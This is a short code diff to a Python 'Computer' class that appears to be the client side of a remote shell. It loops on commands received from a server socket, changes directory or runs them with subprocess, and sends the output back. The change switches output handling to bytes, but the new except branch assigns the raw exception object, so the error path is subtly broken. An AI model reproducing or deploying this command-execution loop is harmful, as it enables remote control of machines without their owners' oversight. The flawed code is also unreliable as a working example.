@@ -14,7 +14,7 @@ class Computer:
     socket.send(self.get_prompt()) # send prompt to server
     cmd=socket.receive()
     while cmd != 'exit':
-      out=''
+      out=b''
       try:
         if cmd=="cd": # if cd alone, go to home
           os.chdir(self.get_env()[1])
@@ -22,14 +22,14 @@ class Computer:
           os.chdir(cmd[3:].strip()) # go to path
         else: # else run command
           output = run(cmd.split(' '), check=False, stdout=PIPE, stderr=PIPE, timeout=5)
-          out=output.stdout.decode("utf-8")
-          err=output.stderr.decode("utf-8")
-          out=f"{out}{err}" # concat stdout and stderr
+          out=output.stdout
+          err=output.stderr
+          out=out+err # concat stdout and stderr
       except Exception as e:
-        out=str(e)
+        out=e
       # send output to server, even if it's an error
       # * is separator between prompt and output
-      socket.send("*".join([self.get_prompt(), out]))
+      socket.send(b"*".join([self.get_prompt().encode(), out]), as_bytes=True)
       cmd=socket.receive()
     # go back to original path
     os.chdir(origin)
